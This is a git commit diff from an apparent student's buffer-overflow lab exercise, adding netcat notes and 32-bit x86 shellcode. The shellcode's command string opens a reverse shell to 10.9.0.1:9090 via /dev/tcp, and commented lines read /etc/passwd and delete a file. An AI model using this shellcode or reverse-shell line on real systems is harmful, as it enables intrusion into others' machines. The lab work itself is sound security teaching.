2572a7a30ea60bd9b5fb37e8b78ae794c6541160
gomitolof <fifreda@hotmail.it>
2022-12-06 18:31:57 +0100

    face buff over L1

---
+++ Buffer_Overflow_Lab-20221205/Labsetup/report.md
@@ -0,0 +1,5 @@
+echo hello | nc 10.9.0.5 9090
+
+nc -nv -l 10.9.0.1 9090
+
+cat badfile | nc 9090
--- Buffer_Overflow_Lab-20221205/Labsetup/shellcode/shellcode_32.py
+++ Buffer_Overflow_Lab-20221205/Labsetup/shellcode/shellcode_32.py
@@ -3,10 +3,9 @@ import sys
 
 # You can use this shellcode to run any command you want
 shellcode = (
-   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
-   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
-   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
-   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
+   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
+   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
+   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
    "/bin/bash*"
    "-c*"
    # You can modify the following command string to run any command.
@@ -16,16 +15,18 @@ shellcode = (
    # so the command string ends here.
    # You can delete/add spaces, if needed, to keep the position the same. 
    # The * in this line serves as the position marker         * 
-   "/bin/ls -l; echo Hello 64; /bin/tail -n 4 /etc/passwd     *"
-   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
-   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
-   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
-   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
+   # "/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *"
+   # "/bin/rm remove.txt                                        *"
+   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
+   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
+   "BBBB"   # Placeholder for argv[1] --> "-c"
+   "CCCC"   # Placeholder for argv[2] --> the command string
+   "DDDD"   # Placeholder for argv[3] --> NULL
 ).encode('latin-1')
 
 content = bytearray(200)
 content[0:] = shellcode
 
 # Save the binary code to file
-with open('codefile_64', 'wb') as f:
+with open('codefile_32', 'wb') as f:
   f.write(content)
